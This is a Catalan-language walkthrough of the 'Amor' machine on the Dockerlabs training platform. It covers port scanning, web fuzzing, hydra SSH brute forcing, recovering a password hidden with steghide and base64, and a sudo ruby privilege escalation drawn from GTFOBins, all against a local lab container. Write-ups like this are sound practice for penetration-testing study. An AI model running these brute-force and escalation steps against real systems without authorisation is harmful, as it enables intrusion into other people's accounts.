# Amor

Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:10

## Reconeixement

### NMAP

```bash
sudo nmap -p- -sS -sCV --min-rate 5000 -vvv  -n -Pn 172.17.0.2 -oG allports
```

![image.png](../../.gitbook/assets/image.png)

```bash
sudo nmap -sCV -p22,80 172.17.0.2 -oN targeted
cat targeted -l ruby
```

![image.png](<../../.gitbook/assets/image 1.png>)

Web :

![image.png](<../../.gitbook/assets/image 2.png>)

Possibles usuaris :

Carlota Juan

### Provem possibles usuaris SSH

### Fuzzing WEB

```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -u [http://172.17.0.2/](http://172.17.0.2/) -x html,php,php7,txt,py
```

![image.png](<../../.gitbook/assets/image 3.png>)

Fuff per trobar directoris :

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "[http://172.17.0.2/FUZZ](http://172.17.0.2/FUZZ)" -recursion -recursion-depth 2 -c -ic -v
```

### Explotacio

Provem hydra amb els usuarios trobats:

Juan : no troba pass Carlota: babygirl

provem conexio ssh

Entrem com a carlota i trobem fitxer:

![image.png](<../../.gitbook/assets/image 4.png>)

Descarreguem fitxer amb :

```bash
ssh [carlota@172.17.0.2](mailto:carlota@172.17.0.2) 'cat /home/carlota/Desktop/fotos/vacaciones/imagen.jpg' > /home/fil/Desktop/docker/imagen.jpg
```

Mirem contingut amb Exiftool, pero no trobem res

![image.png](<../../.gitbook/assets/image 5.png>)

Trobem un altre usuari:

oscar ubuntu

Provem hydra

```bash
hydra -l oscar -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -vV
```

No trobem pass

Probem a extreure info amb :

```bash
sudo steghide extract -sf imagen.jpg
```

Trobem fitxer secret.txt

![image.png](<../../.gitbook/assets/image 6.png>)

ZXNsYWNhc2FkZXBpbnlwb24=

Decodifiquem cadena: echo "ZXNsYWNhc2FkZXBpbnlwb24=" | base64 -d; echo

ZXNsYWNhc2FkZXBpbnlwb24=:eslacasadepinypon

Probem aquest password amb l'altre usuari

Oscar eslacasadepinypon

Entrem per ssh

```bash
ssh [oscar@172.17.0.2](mailto:oscar@172.17.0.2)
Pass: eslacasadepinypon
```

Busquem fitxers

![image.png](<../../.gitbook/assets/image 7.png>)

Al escriptori hi ha un txt:

![image.png](<../../.gitbook/assets/image 8.png>)

### Escalada

Busquem permisos amb sudo

```bash
Sudo -l
```

![image.png](<../../.gitbook/assets/image 9.png>)

Podem explotar: ruby

Busquem GTOBINS:

![image.png](<../../.gitbook/assets/image 10.png>)

Executem :

![image.png](<../../.gitbook/assets/image 11.png>)

![image.png](<../../.gitbook/assets/image 12.png>)
